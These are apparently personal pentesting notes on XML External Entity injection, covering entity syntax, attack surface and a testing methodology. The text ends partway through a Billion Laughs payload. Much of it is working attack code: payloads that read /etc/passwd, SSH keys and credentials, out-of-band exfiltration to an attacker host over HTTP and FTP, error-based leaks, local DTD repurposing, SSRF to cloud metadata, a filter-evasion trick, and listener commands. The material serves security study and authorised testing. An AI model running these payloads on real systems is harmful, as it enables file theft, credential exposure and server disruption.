---
created: 2026-05-07
tags:
  - injection
  - web_hacking
---


## XXE

>**(XML External Entity (XXE) injection** is a security vulnerability that allows an attacker to interfere with an application's processing of XML data by exploiting an XML parser's native capacity to resolve external entity declarations.

- At its core, XXE exploits the XML parser's ability to process and evaluate *external entities* — references to external resources like files or network endpoints.

- Two key conditions must both be satisfied for XXE to be exploitable:
	- **User-controlled XML input reaches the parser**
		- The application accepts user-controlled XML input without proper validation (e.g., via a `POST` body, file upload, SOAP API, or JSON API internally converted to XML).
	- **The parser is configured to resolve external entities**
		- The parser follows `SYSTEM` or `PUBLIC` URI references in entity declarations, fetching the resource and substituting its content into the document.

- When both conditions hold, an attacker can inject a custom DTD (Document Type Definition) into XML data with an external entity declaration. The entity can refer to a local file or a network endpoint. 
- The parser expands that entity by reading the referenced resource and substituting its content wherever the entity is referenced in the document.

>[!example]+
>- Suppose an application data data from an HTML form in XML format:
> 
> ```XML
> <user> 
> 	<name>John</name> 
> </user>
> ```
> - The `name` parameter value (e.g., `John`) is reflected in the response
>- To test for XXE, inject a test DTD with an internal XML entity declaration:
> 
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE test [
>   <!ENTITY testEntity "XXE-TEST">
> ]>
> <user>
>   <name>&testEntity;</name>
> </user>
> ```
>- Instead of `John`, you see `XXE-TEST` in the application response; this means the application expanded internal entity and replaced a reference to it with its value. 
> - Inject an external entity resolving to `/etc/hostname`:
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE test [
>   <!ENTITY ext SYSTEM "file:///etc/hostname">
> ]>
> <user>
>   <name>&ext;</name>
> </user>
> ```
> 
>- If the response contains the hostname of the target server, this means the XML parser process **XML external entities**.
>- You can use this to retrieve other files (out-of-band — because XML parser may not handle all characters for display gracefully):
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE data [
>   <!ENTITY % file SYSTEM "file:///etc/passwd">
>   <!ENTITY % data SYSTEM "http://<attacker_ip_address>:8000/?data=%file;">
>   <!ENTITY % exfil SYSTEM "%data;">
>   %exfil;
> ]>
> <root>&exfil;</root>
> ```
> 
> The XML parser on the server reads the `/etc/passwd` file, and includes its content in the `data` parameter of an HTTP `GET` request it sends to your controlled endpoint, `http://<attacker_ip_address>:8000`. To get the data, check your server logs.

>[!interesting]+ How XXE exploitation works
> - When you inject an external entity declaration into XML input, the parser reads and stores the entity definition.
> - When the parser encounters a reference to that entity (`&entityName;` syntax), it expands it by attempting to access the resourced specified in the entity definition.
> - If that resource is a file on the server, the parser reads the file contents and puts it in the place where the entity reference appeared. If successful, this allows an attacker to read arbitrary files from the server's filesystem.
### Impact

- Impact of an XXE injection vulnerability primarily depends on XML parser configuration on the server. Potential consequences of successful exploitation include:

- **Local File Inclusion (LFI)**
	-  XXE often leads to **arbitrary file read**. If an XML parser can read local files via the `file://` schema, an attacker can retrieve sensitive files from the server's filesystem, such as configuration files, source code, SSH keys, or system files like `/etc/passwd`.


- **SSRF (Server-Side Request Forgery)**
	- External entities can be used to make arbitrary HTTP(S) requests, which can be exploited in SSRF attacks.
	- Because these requests originate from the server itself, they bypass firewall restrictions and can access internal endpoints that are normally unreachable from the Internet, such as cloud metadata endpoints, internal APIs, or services running withing the local network.
	- See [[Server-side request forgery]].

- **DoS (Denial of Service)**
	- Through nested entity definitions, it is possible to cause exponential entity expansion which can exhaust server memory and lead to Denial of Service. Famous examples include the **Billion Laughs** and **Quadratic blowup** attacks.

- **RCE (Remote Code Execution)**
	- Under certain conditions, it is possible to escalate XXE to remote code execution, such as with PHP wrappers, or combined with Java deserialization, or in case of SSH key theft. 

>[!important] XXE exploitation largely depends on the XML parser in use.
> 
> - **Most Java XML parsers process of XML external entities by default.** This is why Java-based applications are especially vulnerable to XXE attacks.
> - Microsoft's .NET framework has XXE processing disabled in recent versions, but legacy application may still be vulnerable.
> - PHP 8.0 versions and newer prevent XXE by default when using the default parser. For versions prior to 8.0, it's enable by default, but can be disabled by setting `libxml_set_external_entity_loader(null);`.
> - Most Python XML parsers disable XML external entities by default, but they're still vulnerable to DoS through the [[#Billion Laughs]] and [[#Quadratic blowup]] attacks.
> 
> See [`XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) for more about XXE vulnerability in different XML parsers and how to mitigate it.

## Background: XML, DTDs, and Entities

### Document Type Definitions

> **A Document Type Definition (DTD)** is a schema embedded in or referenced by an XML document that defines the document's allowed structure, including its elements, attributes, and entities. A parser *may* use the DTD to validate the document and to resolve entity references during parsing.

- DTDs are declared with the `DOCTYPE` directive:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rootElement [
    <!-- DTD declarations -->
]>
<rootElement>
    <!-- XML content -->
</rootElement>
```

- The `DOCTYPE` declaration appears after the optional XML declaration (`<?xml ... ?>`) and before the root element.

- A DTD can be:
	- **Internal** — embedded directly inside the `DOCTYPE`.
	- **External** — loaded from a local file or remote URL via `SYSTEM` or `PUBLIC`.
	- **Hybrid** — combines an external DTD with additional internal declarations.

>[!example]+
> ```XML
> <!-- external DTD -->
> <!DOCTYPE content SYSTEM "http://attacker.com/evil.dtd">
> 
> <!-- hybrid DTD -->
> <!DOCTYPE content SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd" [
>     <!ENTITY % customEntity "...override...">
> ]>
> ```

### XML entities

> **An XML entity** is a reusable named value defined in a DTD. When the parser encounters an entity reference, it replaces the reference with the entity's value during XML processing.

- XML includes several predefined entities for reserved characters:
	- `&lt;` → `<`
	- `&gt;` → `>`
	- `&amp;` → `&`
	- `&apos;` → `'`
	- `&quot;` → `"``

- Entities are divided into twp main types:
	- **Generic entities** — referenced inside XML document content; syntax: `&entity;`.
	- **Parameter entities** — referenced only inside the DTD; syntax: `%entity;`
- Each type can be either internal or external. 

---

- **Internal general entity** (`&entity;`) — Defined directly in the DTD; referenced in the XML document body:
	
	```XML
	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE note [
	  <!ENTITY name "Alice">
	]>
	<note>&name;</note>
	```

- **External general entity** (`&entity;`) — Loaded from a file or URL via `SYSTEM` or `PUBLIC`; referenced in the XML document body:

```XML
<!-- local file -->
<!DOCTYPE note [
    <!ENTITY msg SYSTEM "file:///tmp/message.txt">
]>
<note>&msg;</note>
```

```XML
<!-- remote URL -->
<!DOCTYPE note [
  <!ENTITY msg SYSTEM "https://example.com/message.txt">
]>
<note>&msg;</note>
```

- **Internal parameter entity** (`%entity;`) — Defined in the DTD; used *only inside the DTD* (not in document content):

```XML
<!DOCTYPE note [
  <!ENTITY % tag "note">
  <!ELEMENT %tag; (#PCDATA)> <!-- expands to <!ELEMENT note (#PCDATA)> -->
]>
<note>Hello</note>
```

- **External parameter entity** (`%entity;`) — Loaded from a file or URL via `SYSTEM` or `PUBLIC`; used *only inside the DTD*:

```XML
<!DOCTYPE note [
  <!ENTITY % defs SYSTEM "defs.dtd">
  %defs;
]>
<note>Hello</note>
```
#### `SYSTEM` vs. `PUBLIC`

- External entities can be declared using either `SYSTEM` or `PUBLIC`.

```XML
<!ENTITY ext SYSTEM "http://attacker.com/test.txt">
<!ENTITY ext PUBLIC "id" "http://attacker.com/test.txt">
```

- `SYSTEM` specifies a direct system identifier (typically a URI).
- `PUBLIC` includes a public identifier plus a URI fallback.

From an exploitation perspective, both work identically;. In some cases, `PUBLIC` declarations may bypass naive filters that only block the `SYSTEM` keyword.

#### URI schemes in external entities

- Supported URI schemes depend on the parser and runtime environment. Common examples include:
	- `file:///` — Read local files.
	- `http://` / `https://` — Trigger outbound HTTP requests (SSRF).
	- `ftp://` — Alternate outbound channel; useful for OOB exfiltration.
	- `gopher://` — Useful for raw protocol interaction on some systems.
	- `php://filter/...` — PHP stream wrapper tricks (for example Base64 encoding).
	- `expect://` — Command execution via the PHP Expect extension (rare).
	- `jar://`, `netdoc://` — Java-specific handlers.
#### XML `standalone` attribute

The XML declaration may contain a `standalone` attribute:

```XML
<?xml version="1.0" standalone="yes"?>
```

- `standalone="yes"` — Declares that the document does not rely on external markup declarations.
- `standalone="no"` — Indicates external declarations may be required; the default value.

`standalone` does **not** reliably prevent external entity resolution. Actual behavior depends on the XML parser implementation and its security configuration. Many parsers ignore the attribute entirely.

### CDATA sections

> A **CDATA section** (`<![CDATA[...]]>`) instructs the parser to treat enclosed content as literal character data instead of XML markup.

- Inside a CDATA section, characters such as `<`, `>`, and `&` are not interpreted as XML syntax.

```XML
<![CDATA[
<xml>This is treated as text</xml>
]]>
```

- CDATA becomes relevant in XXE exploitation when you need to retrieve a file that contains XML special characters that would otherwise break parsing.

>[!important] Everything between `<![CDATA[` and `]]>` is treated literally.

>[!warning] CDATA sections **can't contain the sequence `]]>`**, because it terminates the section.

### Parser Behavior by Platform

The degree of XXE exposure depends heavily on the XML parser in use:

- **Java (Xerces, etc.)** — External entity resolution is **enabled by default**; Java-based applications are the most consistently exploitable XXE targets.
- **PHP (`libxml` < 8.0)** — older versions allowed external entity resolution by default; modern versions (PHP 8.0+) are more restrictive.
- **.NET** — Modern parsers generally disable external entity resolution by default, though legacy configurations remain vulnerable.
- **Python (`lxml`, `ElementTree`)** — External entities are typically disabled by default, but entity expansion DoS may still be possible.
- **Ruby (`Nokogiri`)** — External entity expansion is disabled by default since version 1.5.4.

> [!note] The [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) documents parser-specific mitigation steps for each for the platforms mentioned above. You can use it to evaluate target's security posture during an assessment.

## Attack surface

>[!important] XXE vulnerabilities only exist where XML reaches a parser.

- XML is heavily used in web services and APIs that need to exchange structured data:
	- **[SOAP (Simple Object Access Protocol)](https://en.wikipedia.org/wiki/SOAP)** uses XML to transport data.
	- **[REST (Representational State Transfer)](https://en.wikipedia.org/wiki/REST) APIs** may serialize data as XML (`Content-Type: application/xml` or `text/xml`).
	- **[RSS (RDF Site Summary or Really Simple Syndication)](https://en.wikipedia.org/wiki/RSS)** uses XML to distribute news feeds and blog updates.
	- **[XHTML (Extensible HyperText Markup Language)](https://en.wikipedia.org/wiki/XHTML)** is part of the family of XML markup languages that extends HTML.
	- **[SVG (Scalable Vector Graphics)](https://en.wikipedia.org/wiki/SVG)** is an XML-based vector image format widely used on the web.
	- **[AJAX (Asynchronous JavaScript and XML)](https://en.wikipedia.org/wiki/Ajax_(programming)** is one of the most common ways to exchange data asynchronously in web requests, and it often uses XML for data serialization.
	- **[XMPP (Extensible Messaging and Presence Protocol)](https://en.wikipedia.org/wiki/XMPP)** is an XML-based protocol for instant messaging.
	- **Configuration files** used by web servers (e.g., [Apache](https://en.wikipedia.org/wiki/Apache_HTTP_Server)), applications, and frameworks to store settings are often formatted as XML documents.

>[!tip]+ XML MIME types
> ```
> application/xml
> text/xml
> application/xml-external-parsed-entity
> text/xml-external-parsed-entity
> application/xml-dtd
> image/svg+xml
> ```

XML processing points include:

- **API and web application endpoints**:
	- REST APIs that use XML (`application/xml`, `text/xml`, etc.  ). 
	- SOAP APIs (often legacy systems).
	- [XML-RPC](https://en.wikipedia.org/wiki/XML-RPC) endpoints.
	- [SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language) authentication systems (SSO)
	- [RSS](https://en.wikipedia.org/wiki/RSS)/[Atom](https://en.wikipedia.org/wiki/Atom_(web_standard)) feed processors and aggregators.
	- API import/export features.
	- Configuration file uploads.

- **XML-based file formats**:
	- XML documents: `.xml`
	- Office documents:
		- Word: `.docx`, `.docm`
		- Excel: `.xlsx`, `.xlsm`
		- PowerPoint: `.pptx`, `.pptm`
	- Templates and ad-ins: `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam`, etc.
	- ODF (OpenDocument Format, used by LibreOffice and OpenOffice): `.odt`, `.ods`, `.odp`.
	- Scalable Vector Graphics (SVG): `.svg`
	- XHTML documents: `.xhtml`
	- MathML: `.mathml`
	- 3D graphics: `.x3d`
	- Specialized formats: `.gpx` (GPS data), `.dae` (3D models), `.rss` (RSS), `.atom` (Atom), etc.
	- etc.

| Format                   | Extensions                                                    |
| ------------------------ | ------------------------------------------------------------- |
| Generic XML              | `.xml`                                                        |
| Microsoft Office (OOXML) | `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`          |
| Office templates/add-ins | `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam` |
| OpenDocument Format      | `.odt`, `.ods`, `.odp`                                        |
| Scalable Vector Graphics | `.svg`                                                        |
| XHTML                    | `.xhtml`                                                      |
| MathML                   | `.mathml`                                                     |
| 3D graphics              | `.x3d`, `.dae`                                                |
| GPS data                 | `.gpx`                                                        |
| Syndication              | `.rss`, `.atom`                                               |
> [!note]- XML file extension list for fuzzing
> 
> ```
> .xml  
> .docs  
> .docm  
> .xlsx  
> .xlsm  
> .pptx  
> .pptm  
> .dotx  
> .dotm  
> .xltm  
> .potx  
> .potm  
> .ppam  
> .odt  
> .ods  
> .odp  
> .svg  
> .xhtml  
> .mathml  
> .x3d  
> .gpx  
> .dae  
> .rss  
> .atom
> ```

>[!note] See [[File upload]].

- Some less obvious XML processing paths:
	- Applications that *accept JSON* but *internally convert it to XML* before processing.
	- Web frameworks with middleware that transparently parses XML request bodies.
	- PDF generators that accept XML-formatted template input.
	- Database features: MySQL `LOAD XML`, PostgreSQL XML parsing functions.
	- Java and .NET functions that deserialize XML-encoded objects.
	- Some applications accept XML in URL parameters, though this is less common.

>[!tip]+ Some applications support **multiple formats**. Sometimes, changing `Content-Type` to `application/xml` may cause the application to switch parsers.

> [!note] OOXML formats (`.docx`, `.xlsx`, etc.) are ZIP archives that *contain* XML files. If the server extracts and parses these server-side — for document preview, conversion, or indexing — each embedded XML file is a potential XXE injection point.

> [!important]+ XML MIME types
> - `application/xml` — Standard XML.
> - `text/xml` — Legacy XML content type.
> - `application/soap+xml` — SOAP web services.
> - `application/xhtml+xml` — XHTML documents.
> - `image/svg+xml` — SVG graphics.
> - `application/rss+xml` — RSS feeds.
> - `application/atom+xml` — Atom feeds.
> -  `application/xml-external-parsed-entity` (`text/xml-external-parsed-entity` is an alias).
> - `application/xml-dtd` (for DTDs).
> 
> ```
> application/xml    
> text/xml    
> application/soap+xml    
> application/xhtml+xml    
> image/svg+xml    
> application/rss+xml    
> application/atom+xml
> ```
> 

- Indicators of XML processing:
	- Responses formatted as XML (start with `<?xml` or contain XML tags).
	- Error messages referencing XML parsing — these may expose parser type, version, and configuration.
	- Responses that reflect submitted input back in an XML-structured body.
	- SOAP faults or XML validation errors in response to malformed input.

## XXE injection testing methodology

### 1. Confirm internal entity processing

- Before testing external entities, confirm that the parser processes entities at all. Inject a benign internal entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY probe "XXE-CANARY">
]>
<root>
  <field>&probe;</field>
</root>
```

- If the response reflects `XXE-CANARY` where `&probe;` was referenced, this means the parser expands internal entities. 

>[!note] If you don't see the value of the external entity reflected on the page, this doesn't mean the application didn't expand it; the application may process the entity and not include it in the response. 

>[!example]+ Example: Testing for XXE
> Suppose an application sends your form data in XML format:
> 
> ```HTTP
> POST /api/submit_data HTTP/1.1
> Host: example.com
> Content-Length: 142
> Accept-Language: en-US,en;q=0.9
> Content-Type: text/xml;charset=UTF-8
> ...
> ```
> ```XML
> <?xml version="1.0" encoding="UTF-8"?>
> <root>
> 	<name>Name</name>
> 	<tel></tel>
> 	<email>example@email.com</email>
> 	<message>message</message>
> </root>
> ```
> 
> - To test for XXE, inject `DOCTYPE` declaration repeat the request:
> 
> ```XML
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE test [
>   <!ENTITY testEntity "XXE-TEST">
> ]>
> <root>
> 	<name>&testEntity;</name>
> 	<tel></tel>
> 	<email>example@email.com</email>
> 	<message>message</message>
> </root>
> ```
### 2. Test external entity resolution (in-band)

- Attempt external entity resolution against a safe local file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY ext SYSTEM "file:///etc/hostname">
]>
<root>
  <field>&ext;</field>
</root>
```

- `/etc/hostname` is preferred over `/etc/passwd` for initial testing because it is a single line with no special characters, and it's unlikely to trigger parser errors. If the hostname appears in the response, this confirms external entity resolution. 

- Attempt to read a file with newlines or special characters:

```xml
<!ENTITY ext SYSTEM "file:///etc/passwd">
```

- Try `PUBLIC` to evade filters rules that specifically block `SYSTEM`:

```xml
<!ENTITY ext PUBLIC "any-string" "file:///etc/passwd">
```

 >[!tip]+ Fuzz XML payloads
>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)
### 3. Enumerate accessible files 

- Once LFI is confirmed, enumerate files systematically. High-value targets on Linux:

- `/etc/passwd`: User accounts, UID/GID mapping.
- `/etc/hosts`: Internal network names.
- `/etc/hostname`: Hostname (no newlines; safe for XML).
- `/proc/self/environ`: Process environment variables (may contain secrets, paths).
- `/proc/self/cmdline`: Command line of the current process.
- `/proc/net/tcp`: Active TCP connections.
- `/proc/net/fib_trie`: Routing table.
- `/var/log/apache2/access.log`: Apache access logs.
- `/var/www/html/config.php`: PHP application configuration (database credentials).
- `/home/<user>/.ssh/id_rsa`: SSH private keys.
- `/root/.ssh/id_rsa`: Root SSH private key.
- `~/.aws/credentials`: AWS access keys.
- `/etc/shadow`: Password hashes (requires root-level process).
- `/root/.bash_history`: Command history (requires root-level process).


```powershell
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
/proc/net/fib_trie
/var/log/apache2/access.log
/var/www/html/config.php
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
~/.aws/credentials
/etc/shadow
/root/.bash_history
```

- On Windows:
	
	- `C:\Windows\System32\drivers\etc\hosts` — Internal network names.
	- `C:\inetpub\wwwroot\web.config` — IIS server configuration file (XML).
	- `C:\Windows\win.ini` — Legacy windows configuration file.
	- `C:\Users\<user>\.ssh\id_rsa` — SSH private keys.

```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
C:\Users\<user>\.ssh\id_rsa
```

>[!tip] Fuzz files using LFI wordlists
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
> - [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt) (Windows)


### 4. Handle special characters — CDATA or PHP filter

- Files with XML special characters (`<`, `>`, `&`) can't be directly embedded in entity values — the parser will interpret them as XML markup and fail. 
- Two standard solutions:
	- **PHP filter wrapper with Base64 encoding**
	- **CDATA wrapping**
#### PHP filter wrapper with Base64 encoding

- The `php://filter` wrapper applies a transformation to the input stream, and can be used to Base64-encode file content before it reaches the XML parser (`convert.base64-encode`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>
  <data>&file;</data>
</root>
```

- The response will contain a Base64 string. Decode it locally:

```bash
echo -n "BASE64STRING" | base64 -d
```

>[!note] This method only works on PHP servers with `php://` enabled.
#### CDATA wrapping via external DTD

For non-PHP environments, you can use XML's **CDATA (Character Data)** section to handle special characters.

1. Host the following DTD on your HTTP sever:

```xml
<!-- xxe.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
<!ENTITY % end "]]>">
<!ENTITY joined "%start;%file;%end;">
```

2. Serve it:

```bash
python3 -m http.server 8000
```

3. Inject a payload (server XML Input) that references the DTD you serve:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://<attacker_ip_address>:8000/xxe.dtd">
  %dtd;
]>
<root>
  <data>&joined;</data>
</root>
```

- The parser fetches your DTD, defines all three parameter entities (`start`, `file`, `end`) as external (making combination valid), and constructs `&joined;` as `<![CDATA[` + file contents + `]]>`. The CDATA section causes the parser to treat the file content as raw character data.

### 5. Blind XXE — OOB exfiltration

- When the application does not reflect entity content in the response, in-band techniques fail. But you may be able to extract data using Out-of-Band (OOB) techniques.

- Basic OOB via inline parameter entities: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://<attacker_ip_address>:8000/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```

1. `%file` is defined as an **external parameter entity** that reads `/etc/passwd`.
2. `%eval` is defined as a **parameter entity** whose value is a *string containing another entity declaration* — the `%oob` entity. 
	- The `%` in that inner declaration is XML-entity-encoded as `&#x25;` because a literal `%` inside a parameter entity value would be parsed as an entity reference rather than a literal character.
3. When `%eval;` is referenced in the DTD, the parser substitutes the string — which happens to be a valid entity declaration — effectively injecting `%oob` into the DTD.
4. When `%oob;` is referenced, the parser attempts to resolve the URI `http://<attacker_ip_address>:8000/?data=<contents_of_passwd>`, which arrives as an HTTP GET request on your listener.

- Start your listener before sending the payload:

```bash
python3 -m http.server 8000 # simple Python HTTP server
```

```bash
nc -lvnp 8000 # Netcat for raw capture
```

- Check server logs for the incoming request. The file contents will appear URL-encoded in the `data` parameter.

#### Newlines

- Files with newlines may cause the URI to break. Two solutions:
	- PHP Base64 filter (as with in-band XXE injection)
	- FTP instead of HTTP

- If these don't work, target single-line files as a fallback.

###### PHP Base64 filter

- Use PHP Base64 filter to encode for transmission:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://<attacker_ip_address>:8000/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```

- PHP decoding server:

```php
<?php
if (isset($_GET['data'])) {
    error_log("\n\n" . base64_decode($_GET['data']));
}
?>
```

```bash
php -S 0.0.0.0:8000
```

##### FTP instead of HTTP

- FTP doesn't have HTTP's URL newline restrictions. Some parsers support `ftp://`:

```xml
<!ENTITY % oob SYSTEM "ftp://<attacker_ip_address>:21/?data=%file;">
```

- You will need an FTP listener that captures the connection:

```bash
nc -lvnp 21
```

For a proper capture, use a Python FTP server that logs the RETR arguments.

#### OOB via external DTD

When inline parameter entity construction is blocked (some parsers restrict nested entity declarations in internal DTDs), offload the payload to an externally hosted DTD:

- Host `attacker.dtd` on your server:

```xml
<!-- attacker.dtd on your server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<attacker_ip_address>:8000/?data=%file;'>">
```

- XXE injection payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker_ip_address>:8000/attacker.dtd">
  %remote;
  %oob;
]>
<root>
  <field>&exfil;</field>
</root>
```

- Here `%remote;` loads your external DTD, `%oob;` injects the `exfil` general entity declaration into scope, and `&exfil;` in the document body triggers the HTTP request carrying the file contents.

### 6. Error-based exfiltration

- When the application suppresses all output and blocks outbound connections, error messages may still carry data. This technique deliberately causes a parser error by referencing a non-existent file whose path embeds the target file's contents.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><field>trigger</field></root>
```

1. `%file` reads `/etc/passwd` into the parameter entity.
2. `%eval` defines `%error` as an entity referencing the path `file:///nonexistent/<CONTENTS_OF_PASSWD>`.
3. `%error;` causes the parser to attempt to open that path — which does not exist — producing an error like: `java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash:x:1:1:...`
4. If the application propagates this error message to the HTTP response, the file contents are visible in the error output.

- This works best against Java-based parsers which produce verbose, path-inclusive error messages. It is also useful as a fallback when the application blocks OOB connections.

### 7. Test for SSRF via XXE

- External entity resolution via `http://` or `https://` makes the XML parser issue server-side HTTP requests — this is SSRF by definition. 
- The requests originate from the server itself, bypassing perimeter firewalls and reaching internal endpoints unreachable from the internet.

>[!note] See [[Server-side request forgery]].

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <field>&ssrf;</field>
</root>
```

## `XInlcude` injection

>`XInclude` (`<xi:include>`) is a W3C specification (`http://www.w3.org/2001/XInclude`) that allows an XML document to be built from sub-documents. An XML parser to assembles composite documents by fetching and merging external XML or text resources into the parent document at parse time.

- If an XML parser **supports and processes `XInclude`** and the application accepts untrusted XML input, this can be exploited for XXE injection attacks.

>[!important] `XInclude` attacks do not require injecting a `DOCTYPE` declaration.

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

- The `parse="text"` attribute instructs the processor to include the resource as character data rather than XML. Without it, the processor attempts to parse the file as XML.
- XInclude is useful when:
	- The application wraps attacker-supplied data in its own XML structure (making DTD injection impossible because `DOCTYPE` must precede the root element).
	- The application strips `DOCTYPE` declarations from input but processes `<xi:include>` elements.
	- Server-side XML assembly pipelines include fragments from user-supplied content.

## Repurposing local DTD

- Some environments restrict external HTTP connections but allow local `file://` URIs.
- In these cases, even in a fully blind environment without OOB interactions, the vulnerability can be exploited by **repurposing local DTD files already present on the target server filesystem**.
---
- The technique exploits a specific XML rule: a parameter entity defined in an internal DTD subset can **redefine** a parameter entity that was originally defined in an external DTD.
- So, you can load load a *known local DTD* and then *override one of its parameter entities with a payload*.
---
1. **Enumerate local DTD files**
	- Test common paths and observe how the application behaves; look for changes in response that may indicate the file exists:

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local;
]>
```

>[!tip]+ Common local DTD locations
> 
> ```
> /usr/share/yelp/dtd/docbookx.dtd          (GNOME/yelp documentation)
> /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
> /usr/share/xml/fontconfig/fonts.dtd
> /etc/xml/docbook-xml/4.5/docbookx.dtd
> C:\Windows\System32\wbem\xml\cim20.dtd    (Windows)
> ```

2. **Find an entity you can redefine**
	- Once you found a valid DTD, find a *parameter entity* it defines that your payload can redefine. 
	- Find the DTD source code online and examine its parameter entity declarations (alternatively, fuzz common entity names).

3. **Build a hybrid DTD payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>trigger</message>
```

- Here `%ISOamsa` is a parameter entity defined by the [DocBook DTD](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd). 
- The payload redefines the [`ISOamsa` parameter entity](https://github.com/GNOME/yelp/blob/7856e7f79070f515282875212e1a90f09cfa5538/data/dtd/docbookx.dtd#L1). 
- The new `%ISOamsa` definition attempts to load a non-existent file with the name that **includes the content of the `/etc/passwd` file**. 
- This should trigger an error message that leaks the name of the non-existent file — with `/etc/passwd` inside.

>[!note] The specific entity name to redefine (`ISOamsa` in this example) depends entirely on the local DTD in use. Research the DTD's source to find defined parameter entities.

## XSLT-based XXE

>**[XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT)** is an XML-based language for transforming XML documents.

- If an application allows users to supply XSLT stylesheets, and those stylesheets are applied server-side by a processing engine, this can be exploited in XXE-injection-style attacks:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Or using `xsl:import` to trigger file inclusion:

```xml
<xsl:import href="file:///etc/passwd"/>
```

## Denial of Service via XXE

### The Billion Laughs attack

- If entity expansion limits are unset, it's possible to exploit XXE to trigger **exponential entity expansion** that causes massive memory/CPU consumption and eventually **crashes the server**. This DoS (Denial of Service) attack is known as **the Billion Laughs attack**.

```XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
